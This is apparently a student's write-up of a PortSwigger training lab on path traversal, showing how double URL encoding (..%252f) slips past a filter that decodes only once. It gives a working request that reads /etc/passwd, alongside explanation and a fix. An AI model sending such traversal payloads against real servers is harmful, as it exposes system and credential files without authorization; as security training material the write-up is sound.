# Lab 04 — Sequences stripped with superfluous URL-decode

**Difficulty:** 🟡 Practitioner  
**Technique:** Path Traversal — double URL encoding bypass  
**Link:** https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode

---

## Concept

The application decodes the URL once before applying its traversal filter. By encoding the payload twice, the filter sees a harmless string and lets it through. The server then decodes it a second time during path resolution, reconstructing the original `../` sequence.

---

## Reconnaissance

Same injection point:

```
GET /image?filename=18.jpg
```

Standard traversal sequences (`../`, `/etc/passwd`, `....//`) are all blocked.

---

## Process

### Step 1 — Understand double URL encoding

Each character goes through two rounds of encoding:

```
/   →  %2f  →  %252f
.   →  .    →  .
%   →  %25  →  (already encoded)
```

So `../` becomes `..%252f`:

```
../  →  single encode  →  ..%2f
../  →  double encode  →  ..%252f
```

### Step 2 — How the filter is bypassed

```
Input:          ..%252f..%252f..%252fetc/passwd
Filter decodes: ..%2f..%2f..%2fetc/passwd   ← no ../ found, passes
Server decodes: ../../../etc/passwd          ← traversal reconstructed
```

### Step 3 — Send the payload

```
GET /image?filename=..%252f..%252f..%252fetc/passwd
```

---

## Result

Full `/etc/passwd` contents returned with 200 OK.

---

## Issues encountered

None once the double encoding logic was understood.

---

## Takeaways

- If the filter decodes the URL only once, double encoding bypasses it
- `%25` is the URL encoding of `%` — the key to this technique
- Very common against WAFs that don't fully normalize input before inspecting it
- The correct fix: fully decode and normalize input before validation, then resolve with `realpath()` and check the final path

---

## Encoding reference

| Character | Single encoded | Double encoded |
|---|---|---|
| `/` | `%2f` | `%252f` |
| `.` | `.` | `.` |
| `\` | `%5c` | `%255c` |

---

## References

- [Path Traversal — PortSwigger](https://portswigger.net/web-security/file-path-traversal)
